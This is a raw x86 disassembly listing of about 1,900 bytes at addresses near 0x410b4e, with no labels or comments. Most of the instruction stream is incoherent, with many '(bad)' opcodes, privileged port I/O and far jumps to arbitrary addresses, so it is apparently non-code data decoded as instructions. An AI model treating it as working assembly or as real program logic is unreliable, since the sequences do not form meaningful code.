  410b4e:	pop    esp
  410b4f:	scas   eax,DWORD PTR es:[edi]
  410b50:	adc    al,cl
  410b52:	lods   eax,DWORD PTR ds:[esi]
  410b53:	push   eax
  410b54:	or     al,0x7e
  410b56:	xchg   esi,eax
  410b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b58:	or     DWORD PTR [edx],edx
  410b5a:	fucomi st,st(7)
  410b5c:	cdq    
  410b5d:	(bad)  
  410b5e:	mov    esi,0x6b9fd781
  410b63:	and    ecx,ebp
  410b65:	sub    al,0x55
  410b67:	loop   0x410b05
  410b69:	sub    DWORD PTR [edx+0xe],edx
  410b6c:	ja     0x410af1
  410b6e:	sub    ecx,DWORD PTR [esi-0x13590d71]
  410b74:	mov    ebx,0x1c8a9056
  410b79:	pushf  
  410b7a:	gs or  eax,0xe5d1a186
  410b80:	cmp    BYTE PTR [edi-0x3a],bh
  410b83:	cmp    dl,BYTE PTR [esp+ecx*1+0x6f]
  410b87:	mov    bl,0x0
  410b89:	addr16 dec eax
  410b8b:	inc    esp
  410b8c:	outs   dx,DWORD PTR ds:[esi]
  410b8d:	mov    ah,0xb3
  410b8f:	ret    0xe673
  410b92:	idiv   DWORD PTR [edx+0x4355e42c]
  410b98:	pop    esp
  410b99:	(bad)  
  410b9b:	loop   0x410b86
  410b9d:	ins    DWORD PTR es:[edi],dx
  410b9e:	arpl   WORD PTR [ebx+0xa],dx
  410ba1:	xor    DWORD PTR [ecx-0x60004958],edx
  410ba7:	aad    0x87
  410ba9:	sbb    edi,DWORD PTR [ebx]
  410bab:	adc    BYTE PTR [ebx-0x50],bh
  410bae:	jmp    0x410bea
  410bb0:	and    al,0xc
  410bb2:	push   esi
  410bb3:	adc    eax,0x1a4dd79f
  410bb8:	xchg   DWORD PTR [edi-0x7a],edx
  410bbb:	push   edi
  410bbc:	xor    bl,BYTE PTR [esi]
  410bbe:	cmp    al,0xe2
  410bc0:	ins    DWORD PTR es:[edi],dx
  410bc1:	and    DWORD PTR [eax-0x5c],esi
  410bc4:	or     BYTE PTR [edx-0x53],bl
  410bc7:	sbb    al,al
  410bc9:	xor    eax,0xf4bc3941
  410bce:	mov    ebp,0x2124df0c
  410bd3:	mov    al,0x76
  410bd5:	mov    DWORD PTR [ecx+0x5c4e9a9f],eax
  410bdb:	push   ebx
  410bdc:	push   cx
  410bde:	mov    ah,0x87
  410be0:	(bad)  
  410be1:	in     al,0x60
  410be3:	jp     0x410c2a
  410be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be6:	rol    dl,1
  410be8:	out    dx,eax
  410be9:	sti    
  410bea:	mov    WORD PTR cs:[esi+0x3f],ds
  410bee:	jmp    0x410c2a
  410bf0:	push   eax
  410bf1:	xchg   edx,eax
  410bf2:	rcr    bh,1
  410bf4:	push   ebx
  410bf5:	fst    QWORD PTR [esi+edx*2]
  410bf8:	jne    0x410c14
  410bfa:	jl     0x410c4e
  410bfc:	nop
  410bfd:	into   
  410bfe:	popf   
  410bff:	sbb    al,0xcd
  410c01:	(bad)  
  410c02:	test   al,0xdc
  410c04:	(bad)  
  410c05:	popf   
  410c06:	fist   WORD PTR [edx]
  410c08:	mov    ds:0xcded9080,eax
  410c0d:	lods   eax,DWORD PTR ds:[esi]
  410c0e:	fidivr DWORD PTR [ebp+0x70]
  410c11:	sti    
  410c12:	outs   dx,BYTE PTR ds:[esi]
  410c13:	aas    
  410c14:	mov    ebp,esi
  410c16:	ror    esi,cl
  410c18:	out    dx,al
  410c19:	inc    eax
  410c1a:	dec    ebx
  410c1b:	pop    esi
  410c1c:	add    eax,0xfc96a18a
  410c21:	stos   BYTE PTR es:[edi],al
  410c22:	pushf  
  410c23:	sar    bh,0x90
  410c26:	sbb    esp,DWORD PTR ds:0x77325ad3
  410c2c:	and    al,0xe0
  410c2e:	dec    eax
  410c2f:	mov    ah,0x97
  410c31:	icebp  
  410c32:	scas   al,BYTE PTR es:[edi]
  410c33:	dec    ebx
  410c34:	inc    ebp
  410c35:	push   edx
  410c36:	rcl    DWORD PTR [edi+0x4143a89b],cl
  410c3c:	cmp    eax,0xa9f17db1
  410c41:	lods   al,BYTE PTR ds:[esi]
  410c42:	jae    0x410c0a
  410c44:	ror    DWORD PTR [eax],0x1a
  410c47:	dec    ecx
  410c48:	cmp    eax,0x7f7add77
  410c4d:	out    dx,al
  410c4e:	push   ebx
  410c4f:	jmp    0x410bff
  410c51:	jle    0x410c25
  410c53:	adc    DWORD PTR [edx+0x18],0x144e712f
  410c5a:	jne    0x410caf
  410c5c:	xchg   DWORD PTR [edx-0x3b7a0355],ebx
  410c62:	in     al,dx
  410c63:	leave  
  410c64:	outs   dx,BYTE PTR ds:[esi]
  410c65:	or     DWORD PTR [edx-0x50ae0362],eax
  410c6b:	adc    al,0xa4
  410c6d:	loop   0x410c2b
  410c6f:	jecxz  0x410c6e
  410c71:	inc    eax
  410c72:	mov    dh,0x42
  410c74:	je     0x410c36
  410c76:	cwde   
  410c77:	mov    ebp,0xd1e8aeb5
  410c7c:	leave  
  410c7d:	call   0x6caf931e
  410c82:	or     BYTE PTR [eax+0x69],dl
  410c85:	jmp    0xaed1:0x48ae3620
  410c8c:	test   DWORD PTR [edx-0x6bf53c06],0xdacc7cdd
  410c96:	jp     0x410cbb
  410c98:	hlt    
  410c99:	lahf   
  410c9a:	data16 aam 0x10
  410c9d:	push   edi
  410c9e:	mov    dh,0x60
  410ca0:	(bad)  
  410ca1:	not    DWORD PTR [esi+ecx*1-0x58017a06]
  410ca8:	pop    edx
  410ca9:	cmp    eax,0xea297016
  410cae:	xchg   ecx,eax
  410caf:	bound  esp,QWORD PTR [edx-0x7f]
  410cb2:	call   0x541d46d7
  410cb7:	cli    
  410cb8:	cmp    eax,ebp
  410cba:	mov    BYTE PTR [edi],al
  410cbc:	and    edx,esi
  410cbe:	call   FWORD PTR [ebx+0x2b13b3d]
  410cc4:	xchg   edi,eax
  410cc5:	jb     0x410d2e
  410cc7:	pop    esp
  410cc8:	mov    eax,DWORD PTR [esi+0x7d]
  410ccb:	repnz mov DWORD PTR [esi],eax
  410cce:	mov    eax,0x881e533d
  410cd3:	fcomp  DWORD PTR [edx+ebx*4-0x3311eff4]
  410cda:	pop    ebx
  410cdb:	push   cs
  410cdc:	popa   
  410cdd:	jmp    0x46126a52
  410ce2:	adc    DWORD PTR [esi+0x6c6c734f],edx
  410ce8:	mov    ecx,edx
  410cea:	or     ecx,DWORD PTR [edx+0x70038da9]
  410cf0:	inc    esi
  410cf1:	cmp    al,0x37
  410cf3:	sbb    ch,BYTE PTR [edi+esi*4+0x39048b14]
  410cfa:	sub    edi,DWORD PTR [esi-0x3f]
  410cfd:	out    0x86,eax
  410cff:	push   esp
  410d00:	sahf   
  410d01:	lea    eax,[edx]
  410d03:	pop    esi
  410d04:	jp     0x410cd2
  410d06:	std    
  410d07:	adc    BYTE PTR [eax],cl
  410d09:	jecxz  0x410cd5
  410d0b:	pop    es
  410d0c:	call   0xa1c9c5d1
  410d11:	sub    DWORD PTR [esi+0x0],edi
  410d14:	sar    ebp,1
  410d16:	dec    ebp
  410d17:	imul   ebp,DWORD PTR [edi-0x74],0xffffffd6
  410d1b:	cmp    eax,DWORD PTR [eax]
  410d1d:	cs cdq 
  410d1f:	lods   eax,DWORD PTR ds:[esi]
  410d20:	loop   0x410d59
  410d22:	in     eax,dx
  410d23:	jne    0x410d0f
  410d25:	push   edi
  410d26:	adc    al,0xfc
  410d28:	mov    dl,0x78
  410d2a:	ins    DWORD PTR es:[edi],dx
  410d2b:	pop    edi
  410d2c:	xor    DWORD PTR [esp+eax*4],0xdb358acd
  410d33:	mov    edi,0x58ee28b6
  410d38:	sub    eax,0x3317a81
  410d3d:	out    dx,eax
  410d3e:	xchg   esp,eax
  410d3f:	cmp    eax,esp
  410d41:	jecxz  0x410da8
  410d43:	(bad)  
  410d44:	(bad)  
  410d45:	sahf   
  410d46:	cmp    cl,BYTE PTR [esi-0x3b]
  410d49:	(bad)  
  410d4a:	sbb    al,al
  410d4c:	popf   
  410d4d:	dec    esi
  410d4e:	mov    esi,0xd4afbdf3
  410d53:	mov    ecx,?
  410d55:	xchg   ecx,eax
  410d56:	xlat   BYTE PTR ds:[ebx]
  410d57:	imul   ebx,ebp,0x60f3b7e4
  410d5d:	std    
  410d5e:	dec    ebp
  410d5f:	stos   DWORD PTR es:[edi],eax
  410d60:	mov    ds:0xc735f8a2,al
  410d65:	mov    ebp,0x5e173376
  410d6a:	test   eax,0x6fa800ad
  410d6f:	sub    al,BYTE PTR [ebp-0x280fed88]
  410d75:	adc    ah,dl
  410d77:	push   ecx
  410d78:	mov    ah,0x44
  410d7a:	enter  0x4d97,0x25
  410d7e:	pop    edi
  410d7f:	or     dh,ch
  410d81:	sbb    ecx,edi
  410d83:	les    ebx,FWORD PTR [eax+0x76]
  410d86:	int    0xfd
  410d88:	jbe    0x410d3a
  410d8a:	int    0x71
  410d8c:	stos   BYTE PTR es:[edi],al
  410d8d:	push   esi
  410d8e:	and    BYTE PTR [ecx-0x290885f1],bl
  410d94:	or     eax,DWORD PTR [edx]
  410d96:	int    0x9
  410d98:	and    esi,DWORD PTR [ecx-0x7256d7c6]
  410d9e:	cmp    DWORD PTR [ecx-0x16],edi
  410da1:	sub    edi,DWORD PTR [esi+0x10bc5f0c]
  410da7:	sub    cl,BYTE PTR [edi-0x7d]
  410daa:	gs jo  0x410d8f
  410dad:	adc    BYTE PTR [ecx-0xa91549a],bl
  410db3:	pop    ss
  410db4:	aam    0x78
  410db6:	jne    0x410e24
  410db8:	dec    eax
  410db9:	pusha  
  410dba:	mov    ebx,0x89bdd067
  410dbf:	ja     0x410def
  410dc1:	adc    ebx,ebx
  410dc3:	sub    al,BYTE PTR [eax-0x2b]
  410dc6:	(bad)  
  410dc8:	push   ds
  410dc9:	and    edx,DWORD PTR [ebp+0x5f]
  410dcc:	jmp    0x24ce:0x2bde29cb
  410dd3:	enter  0x65a9,0xe9
  410dd7:	jmp    0xe2e4:0xa1b66a66
  410dde:	rcr    BYTE PTR [ebx+0x2a],cl
  410de1:	mov    al,0x3e
  410de3:	test   al,0x1f
  410de5:	or     BYTE PTR ds:0x67ea8497,bh
  410deb:	js     0x410da7
  410ded:	repz add cl,BYTE PTR [eax+0x2a]
  410df1:	or     DWORD PTR [ecx+esi*8],ebp
  410df4:	mov    ds:0xc6e78a26,eax
  410df9:	or     DWORD PTR [eax-0x359ceacc],ecx
  410dff:	sahf   
  410e00:	sub    DWORD PTR ds:0x28d4bb12,ebx
  410e06:	xchg   BYTE PTR [ecx],ah
  410e08:	push   0xffffffb4
  410e0a:	xchg   edx,eax
  410e0b:	ds loopne 0x410dc1
  410e0e:	jle    0x410e0d
  410e10:	in     al,0xe5
  410e12:	retf   
  410e13:	bound  esp,QWORD PTR [ecx+eiz*1]
  410e16:	cwde   
  410e17:	adc    eax,0x66f9f513
  410e1c:	mov    ah,0x84
  410e1e:	mov    bh,BYTE PTR [edx-0x5f9c4cfc]
  410e24:	out    0x33,al
  410e26:	pop    esp
  410e27:	push   ds
  410e28:	cmp    bh,BYTE PTR [ebx-0x14423ed1]
  410e2e:	xor    DWORD PTR [ecx-0x76],ebx
  410e31:	fiadd  DWORD PTR [ebp-0x379c3399]
  410e37:	mov    al,0xf1
  410e39:	dec    ebx
  410e3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e3b:	pop    eax
  410e3c:	xchg   esi,eax
  410e3d:	dec    edi
  410e3e:	(bad)  
  410e3f:	dec    esi
  410e40:	push   ss
  410e41:	cmp    BYTE PTR [ebx+0x6e],ch
  410e44:	jmp    0x9b107e30
  410e49:	jp     0x410e46
  410e4b:	mov    al,ds:0x419b61d6
  410e50:	mov    es,WORD PTR [ebp-0x2b]
  410e53:	xchg   esp,eax
  410e54:	or     dl,0x24
  410e57:	sub    DWORD PTR [esp+ebp*8],esi
  410e5a:	clc    
  410e5b:	stos   BYTE PTR es:[edi],al
  410e5c:	sbb    al,0xa9
  410e5e:	bound  eax,QWORD PTR [ecx+0x313d3da4]
  410e64:	pop    ebx
  410e65:	adc    ch,BYTE PTR [edi*4-0x6ed6b783]
  410e6c:	ret    0xfe5d
  410e6f:	outs   dx,DWORD PTR ds:[esi]
  410e70:	mov    ebp,0x3ac2a554
  410e75:	jne    0x410e6a
  410e77:	xchg   DWORD PTR [ebp+0x4c],esp
  410e7a:	pop    edi
  410e7b:	sub    BYTE PTR [edi],cl
  410e7d:	pop    ss
  410e7e:	adc    ch,BYTE PTR [ecx+0x23e21f57]
  410e84:	push   cs
  410e85:	aam    0xb0
  410e87:	loope  0x410eef
  410e89:	(bad)  
  410e8b:	repnz les esi,FWORD PTR [esi]
  410e8e:	pop    es
  410e8f:	aad    0xf1
  410e91:	dec    edi
  410e92:	outs   dx,BYTE PTR ds:[esi]
  410e93:	cli    
  410e94:	jno    0x410f15
  410e96:	(bad)  
  410e97:	pop    ebp
  410e98:	sub    DWORD PTR [esi+0x57],ebx
  410e9b:	pop    ebx
  410e9c:	repnz aas 
  410e9e:	add    al,0xc4
  410ea0:	ficomp WORD PTR [edi]
  410ea2:	stc    
  410ea3:	scas   eax,DWORD PTR es:[edi]
  410ea4:	scas   eax,DWORD PTR es:[edi]
  410ea5:	xor    BYTE PTR [bx+di],bl
  410ea8:	sbb    ch,BYTE PTR ds:0x7717d9d7
  410eae:	call   0xafc1:0x15f99343
  410eb5:	in     eax,0xde
  410eb7:	mov    al,ds:0x5968c2ad
  410ebc:	inc    esi
  410ebd:	push   edx
  410ebe:	outs   dx,DWORD PTR ss:[esi]
  410ec0:	jae    0x410e61
  410ec2:	jecxz  0x410ed9
  410ec4:	xchg   edi,eax
  410ec5:	inc    ecx
  410ec6:	addr16 (bad) 
  410ec8:	arpl   bp,bx
  410eca:	(bad)
  410ecd:	out    dx,al
  410ece:	fwait
  410ecf:	jge    0x410ecd
  410ed1:	xor    edx,DWORD PTR [eax+0x21f2c7e7]
  410ed7:	mov    ecx,0x51e42a5c
  410edc:	lods   al,BYTE PTR ds:[esi]
  410edd:	adc    al,0x55
  410edf:	fwait
  410ee0:	jle    0x410ea1
  410ee2:	imul   eax,DWORD PTR [eax+eax*8],0x8cea931c
  410ee9:	(bad)  
  410eeb:	and    BYTE PTR [eax],al
  410eed:	add    al,0x49
  410eef:	adc    ebx,DWORD PTR [edx-0x30b7a427]
  410ef5:	ja     0x410e85
  410ef7:	xchg   DWORD PTR [ecx-0x87cdd23],edi
  410efd:	sbb    bl,BYTE PTR [ecx+0x20]
  410f00:	mov    DWORD PTR [esp+eiz*8],ebp
  410f03:	fadd   st(6),st
  410f05:	dec    eax
  410f06:	repz in al,dx
  410f08:	cdq    
  410f09:	retf   
  410f0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f0b:	jmp    0x5885:0xe1c1a745
  410f12:	dec    esi
  410f13:	loop   0x410ee6
  410f15:	add    BYTE PTR cs:[esi-0x29],ah
  410f19:	cmp    ebx,DWORD PTR [esi]
  410f1b:	pop    es
  410f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f1d:	or     DWORD PTR [bx-0x22d7],ebp
  410f22:	or     eax,0x7299b990
  410f27:	popf   
  410f28:	xchg   ebp,eax
  410f29:	or     BYTE PTR [edi-0x50],al
  410f2c:	fmul   DWORD PTR [edi]
  410f2e:	jb     0x410f14
  410f30:	idiv   dh
  410f32:	lea    ebp,[eax+0x19]
  410f35:	xchg   ebx,eax
  410f36:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410f38:	ins    DWORD PTR es:[edi],dx
  410f39:	sar    DWORD PTR [ecx-0x7d],0x49
  410f3d:	pusha  
  410f3e:	inc    esi
  410f3f:	push   ecx
  410f40:	xchg   edx,eax
  410f41:	mov    edx,0x5a72d36e
  410f46:	push   0x74d15c01
  410f4b:	push   esp
  410f4c:	mov    ?,ebp
  410f4e:	(bad)
  410f51:	sbb    eax,0x70658dc2
  410f56:	pop    es
  410f57:	inc    ebx
  410f58:	or     DWORD PTR [eax+0xa],ecx
  410f5b:	jae    0x410f41
  410f5d:	test   al,0x64
  410f5f:	ds idiv al
  410f62:	hlt    
  410f63:	int3   
  410f64:	lods   eax,DWORD PTR ds:[esi]
  410f65:	inc    eax
  410f66:	sbb    dl,BYTE PTR [edx+0x18]
  410f69:	icebp  
  410f6a:	sub    bh,bh
  410f6c:	mov    bh,0x8a
  410f6e:	rcr    DWORD PTR [edx],1
  410f70:	aaa    
  410f71:	in     al,dx
  410f72:	push   ebx
  410f73:	xor    eax,ebx
  410f75:	outs   dx,DWORD PTR ds:[esi]
  410f76:	hlt    
  410f77:	repz push ebx
  410f79:	call   0xa8c8ebf8
  410f7e:	and    dh,BYTE PTR [ecx]
  410f80:	mov    eax,0x3e8c2001
  410f85:	fsubr  DWORD PTR [esi+0x381a7e7e]
  410f8b:	cmp    edi,DWORD PTR [ecx+eax*2+0x4e9e1a25]
  410f92:	enter  0xa0e7,0x84
  410f96:	lea    ecx,ds:0xdc16085c
  410f9c:	push   es
  410f9d:	sbb    BYTE PTR [ecx-0x28],al
  410fa0:	pusha  
  410fa1:	adc    eax,0x227d839b
  410fa6:	add    al,0xfa
  410fa8:	stos   BYTE PTR es:[edi],al
  410fa9:	fs es mov dh,0xef
  410fad:	or     BYTE PTR [eax-0x12],bh
  410fb0:	push   ss
  410fb1:	xor    al,0xe3
  410fb3:	push   ss
  410fb4:	sbb    bl,dh
  410fb6:	in     eax,dx
  410fb7:	jno    0x410f65
  410fb9:	clc    
  410fba:	mov    dl,0xf
  410fbc:	pop    esp
  410fbd:	mov    bl,0xb2
  410fbf:	dec    ecx
  410fc0:	aas    
  410fc1:	xor    eax,0xa952122d
  410fc6:	mov    edi,DWORD PTR [ebp-0x2c003bf4]
  410fcc:	stos   BYTE PTR es:[edi],al
  410fcd:	and    ah,bl
  410fcf:	jl     0x41102b
  410fd1:	out    dx,eax
  410fd2:	je     0x41104e
  410fd4:	sub    esp,DWORD PTR [edx]
  410fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fd7:	data16 in al,0xbd
  410fda:	or     ebx,ebx
  410fdc:	aas    
  410fdd:	out    dx,eax
  410fde:	out    0x29,al
  410fe0:	lahf   
  410fe1:	xor    ecx,esi
  410fe3:	mov    ds:0xb7e04416,al
  410fe8:	fld    DWORD PTR [ecx+0x49]
  410feb:	js     0x411022
  410fed:	fadd   st(1),st
  410fef:	dec    esi
  410ff0:	mov    dl,0x17
  410ff2:	repz adc al,0x17
  410ff5:	add    al,0x54
  410ff7:	iret   
  410ff8:	outs   dx,BYTE PTR ds:[esi]
  410ff9:	sub    BYTE PTR [ebx],cl
  410ffb:	xchg   edi,eax
  410ffc:	mov    al,ds:0x83ce11c
  411001:	lock inc esi
  411003:	mov    ds:0xe133d097,eax
  411008:	or     DWORD PTR [ebp-0x56],0xcd1e1644
  41100f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  411011:	and    BYTE PTR [ebx-0x58],dh
  411014:	xor    BYTE PTR [ebx+0x7e4ac99d],bl
  41101a:	loop   0x410fb4
  41101c:	adc    edi,esp
  41101e:	push   esp
  41101f:	out    0x5a,al
  411021:	in     eax,0x85
  411023:	scas   al,BYTE PTR es:[edi]
  411024:	sbb    esp,DWORD PTR [ecx-0x6]
  411027:	lods   al,BYTE PTR ds:[esi]
  411028:	sub    al,0x32
  41102a:	imul   BYTE PTR [esi+edx*4]
  41102d:	int3   
  41102e:	pop    eax
  41102f:	out    dx,al
  411030:	ins    DWORD PTR es:[edi],dx
  411031:	lahf   
  411032:	fidivr WORD PTR [esi]
  411034:	dec    esi
  411035:	xor    DWORD PTR [ecx+0x47],ebp
  411038:	shl    bl,cl
  41103a:	sub    eax,0xa0d261e3
  41103f:	jne    0x4110a0
  411041:	sub    al,0x78
  411043:	jns    0x411070
  411045:	std    
  411046:	retf   
  411047:	pop    ds
  411048:	xor    BYTE PTR [edi],ah
  41104a:	adc    BYTE PTR [ecx-0x48],bl
  41104d:	mov    bl,0x2e
  41104f:	mov    bl,0xa2
  411051:	mov    ch,0x1a
  411053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411054:	sar    DWORD PTR [esp+esi*2+0x3481bcae],1
  41105b:	push   cs
  41105c:	jp     0x411084
  41105e:	mov    bl,0x3b
  411060:	pop    ebx
  411061:	fiadd  WORD PTR [ebx]
  411063:	fwait
  411064:	pop    ss
  411065:	lahf   
  411066:	ret    
  411067:	dec    DWORD PTR [ecx+ebx*1+0x5b604103]
  41106e:	inc    BYTE PTR [ebp-0x2d]
  411071:	maxps  xmm0,xmm7
  411074:	out    dx,eax
  411075:	dec    eax
  411076:	mov    ds:0x474df7f7,al
  41107b:	daa    
  41107c:	mov    edx,0x672881c5
  411081:	dec    edi
  411082:	pop    ds
  411083:	push   cs
  411084:	push   esp
  411085:	mov    dh,0x5d
  411087:	mov    eax,DWORD PTR [ecx+0x67e1428f]
  41108d:	inc    eax
  41108e:	add    al,0xa5
  411090:	jp     0x4110b9
  411092:	imul   DWORD PTR [edx]
  411094:	shl    BYTE PTR [esi],0x1e
  411097:	add    al,0x28
  411099:	or     bl,bh
  41109b:	inc    ebx
  41109c:	scas   eax,DWORD PTR es:[edi]
  41109d:	xchg   ebx,eax
  41109e:	fstp   DWORD PTR [edx]
  4110a0:	ror    BYTE PTR [edx],1
  4110a2:	push   eax
  4110a3:	push   0xa3924d6c
  4110a8:	dec    ebx
  4110a9:	dec    esp
  4110aa:	mov    ebx,0xa6eea117
  4110af:	jnp    0x4110ea
  4110b1:	das    
  4110b2:	mov    eax,DWORD PTR [eax+ebp*8-0xf]
  4110b6:	add    dl,BYTE PTR [ebx+0x2f7fdb11]
  4110bc:	outs   dx,DWORD PTR cs:[esi]
  4110be:	int    0xe0
  4110c0:	add    BYTE PTR [edi+0x1c],0xcf
  4110c4:	shl    BYTE PTR [edi],0x55
  4110c7:	dec    edx
  4110c8:	lods   eax,DWORD PTR ds:[esi]
  4110c9:	mov    ebp,0x46294290
  4110ce:	dec    edx
  4110cf:	add    al,0x7
  4110d1:	mov    esp,gs
  4110d3:	test   al,0x9e
  4110d5:	adc    DWORD PTR [eax],0xffffffa4
  4110d8:	cli    
  4110d9:	aad    0xc9
  4110db:	leave  
  4110dc:	mov    ebp,0xe92e3bef
  4110e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110e2:	loopne 0x4110e9
  4110e4:	fcomi  st,st(1)
  4110e6:	call   0xcf89:0x1af1bd1f
  4110ed:	dec    eax
  4110ee:	lahf   
  4110ef:	sti    
  4110f0:	sbb    BYTE PTR [esi],bl
  4110f2:	push   0xa6f87372
  4110f7:	lahf   
  4110f8:	outs   dx,BYTE PTR ds:[esi]
  4110f9:	fistp  QWORD PTR [ebp-0x20]
  4110fc:	mov    DWORD PTR [esi+0x7],edx
  4110ff:	sbb    ebx,DWORD PTR [esi+0x723af4a6]
  411105:	sub    bl,BYTE PTR [edx-0x357b1bcf]
  41110b:	in     eax,dx
  41110c:	or     ch,dl
  41110e:	sbb    bh,BYTE PTR [ecx-0x7a399315]
  411114:	or     eax,0xc407f10
  411119:	or     BYTE PTR [eax-0x6968caa1],0xf9
  411120:	rcr    BYTE PTR [eax+eiz*1+0x61],0xe5
  411125:	jnp    0x4110e6
  411127:	pop    ebp
  411128:	mov    bh,0x48
  41112a:	mov    ds:0xe09401c8,eax
  41112f:	mov    edi,0xe57de095
  411134:	(bad)  
  411135:	mov    ebp,ds
  411137:	in     eax,dx
  411138:	dec    ebx
  411139:	mov    dl,0xcc
  41113b:	jle    0x41110b
  41113d:	pop    ds
  41113e:	aad    0xcc
  411140:	dec    edi
  411141:	pushf  
  411142:	es mov ebx,0x54da1d48
  411148:	in     eax,dx
  411149:	data16 fsubr DWORD PTR [eax]
  41114c:	inc    eax
  41114d:	int    0x8a
  41114f:	pop    ebx
  411150:	retf   
  411151:	pop    edi
  411152:	jle    0x4111a4
  411154:	xchg   esp,eax
  411155:	cld    
  411156:	mov    bl,0xe6
  411159:	shl    BYTE PTR [edi-0x3c3183d2],cl
  41115f:	arpl   bx,bx
  411161:	test   eax,0xc0205ef6
  411166:	fld    TBYTE PTR [esi-0x612e0e14]
  41116c:	add    DWORD PTR [edx+0x1b55189f],ebx
  411172:	mov    bh,0x18
  411174:	sbb    BYTE PTR [ebx],cl
  411176:	sub    esp,DWORD PTR [edx+0x21]
  411179:	cmp    esi,DWORD PTR [esi]
  41117b:	fdiv   DWORD PTR [esp+ebx*1]
  41117e:	push   ebp
  41117f:	mov    dl,0xaf
  411181:	push   0xfd39972d
  411186:	outs   dx,DWORD PTR ds:[esi]
  411187:	loop   0x4111c5
  411189:	xor    al,0xb1
  41118b:	out    dx,eax
  41118c:	adc    BYTE PTR [ecx-0x61037abf],0x3a
  411193:	or     ch,BYTE PTR [edi+0x39ae3573]
  411199:	jne    0x411205
  41119b:	not    BYTE PTR [ebp+0xd]
  41119e:	push   ebp
  41119f:	mov    dh,0x7d
  4111a1:	(bad)  
  4111a2:	cld    
  4111a3:	xchg   ebx,esi
  4111a5:	and    DWORD PTR [edx],ebp
  4111a7:	ja     0x41119f
  4111a9:	xor    eax,DWORD PTR [ecx]
  4111ab:	pop    esi
  4111ac:	jo     0x4111ed
  4111ae:	push   edi
  4111af:	jbe    0x411180
  4111b1:	dec    ebp
  4111b2:	mov    WORD PTR [ebx+0x30f13a82],ss
  4111b8:	jle    0x41117e
  4111ba:	dec    ebx
  4111bb:	cmp    DWORD PTR [edx+0x7e688fbc],esp
  4111c1:	push   ds
  4111c2:	push   es
  4111c3:	sbb    eax,0x66b12325
  4111c8:	inc    esi
  4111c9:	jge    0x41116c
  4111cb:	arpl   WORD PTR ds:0x79190977,di
  4111d1:	shl    DWORD PTR [ebx-0x462a2b47],0xac
  4111d8:	xchg   esi,eax
  4111d9:	(bad)  
  4111da:	into   
  4111db:	lods   eax,DWORD PTR ds:[esi]
  4111dc:	mov    BYTE PTR [edx],dl
  4111de:	xchg   DWORD PTR [ebp+0x20],eax
  4111e1:	xchg   BYTE PTR [eax],dl
  4111e3:	inc    edi
  4111e4:	jnp    0x411221
  4111e6:	daa    
  4111e7:	sub    DWORD PTR [edx+0x4ae4751],esp
  4111ed:	repz cmp eax,0xfb92ca7f
  4111f3:	in     eax,0x1e
  4111f5:	ret    
  4111f6:	js     0x411220
  4111f8:	add    al,0x77
  4111fa:	test   DWORD PTR [ecx-0x28def85e],edx
  411200:	add    al,0x61
  411202:	fs stos BYTE PTR es:[edi],al
  411204:	je     0x4111e0
  411206:	out    dx,eax
  411207:	(bad)  
  411208:	outs   dx,DWORD PTR ds:[esi]
  411209:	pop    eax
  41120a:	inc    ebx
  41120b:	dec    ebx
  41120c:	jge    0x41125b
  41120e:	mov    eax,0x4673c706
  411213:	ja     0x41126c
  411215:	fistp  WORD PTR ds:0x745c4bee
  41121b:	lds    ebp,FWORD PTR [ebp+0x58408e1f]
  411221:	mov    DWORD PTR [ecx-0x79],esi
  411224:	leave  
  411225:	adc    al,0x50
  411227:	add    ch,BYTE PTR [ecx]
  411229:	sbb    dh,bh
  41122b:	pusha  
  41122c:	dec    esp
  41122d:	and    DWORD PTR [ebp+ebp*2-0x4c],ebp
  411231:	xor    al,0x7a
  411233:	xor    eax,0x27e123d5
  411238:	imul   ebp,DWORD PTR [ebx-0x18],0xffffff9b
  41123c:	addr16 sub al,0x69
  41123f:	repnz mov DWORD PTR [esi+esi*4+0x7def0920],ebx
  411247:	mov    edx,0x28d2a52
  41124c:	fsubp  st(3),st
  41124e:	rol    ah,0x26
  411251:	rcr    BYTE PTR [esi+0x17],1
  411254:	aam    0x95
  411256:	leave  
  411257:	ins    DWORD PTR es:[edi],dx
  411258:	adc    eax,ebx
  41125a:	xor    BYTE PTR ds:0xe4756af,cl
  411260:	xchg   edx,eax
  411261:	cmp    eax,0x62698f36
  411266:	into   
  411267:	push   0x90d00024
  41126c:	enter  0x5be4,0x5a
  411270:	mov    ebp,0x5819e25f
  411275:	sub    DWORD PTR [eax-0x23],ebx
  411278:	xor    edi,eax
  41127a:	jle    0x4112ad
  41127c:	pop    ds
  41127d:	push   es
  41127e:	jl     0x41127f
  411280:	bound  eax,QWORD PTR [edi]
  411282:	xchg   ebx,eax
  411283:	push   0x11b970d
  411288:	ret    0x435f
  41128b:	lods   eax,DWORD PTR ds:[esi]
  41128c:	and    al,0x4
  41128e:	sbb    eax,0x8f463434
  411293:	xchg   edi,eax
  411294:	xor    DWORD PTR [edi-0x1a],esi
  411297:	push   ds
  411298:	(bad)  
  411299:	(bad)  
  41129a:	mov    ds:0xb237b427,eax
  41129f:	jnp    0x4112dd
  4112a1:	cli    
  4112a2:	push   cs
  4112a3:	mov    ch,0x4d
  4112a5:	js     0x4112c4
  4112a7:	push   ss
  4112a8:	sti    
  4112a9:	push   0x2116238c
  4112ae:	aas    
  4112af:	outs   dx,DWORD PTR ds:[esi]
  4112b0:	xchg   edi,eax
  4112b1:	lahf   
  4112b2:	ds scas eax,DWORD PTR es:[edi]
  4112b4:	ffreep st(3)
  4112b6:	mov    ecx,0xef04ceaf
  4112bb:	shr    BYTE PTR [ebx-0x512136ec],1
  4112c1:	ret    0xb8ba
  4112c4:	sbb    edx,ebp
  4112c6:	and    BYTE PTR [eax-0x6e0a3f01],bl
  4112cc:	mov    ch,0xfb
  4112ce:	dec    ebx
  4112cf:	repz arpl cx,di
  4112d2:	dec    esi
  4112d3:	in     al,0x1b
  4112d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112d6:	xchg   edx,eax
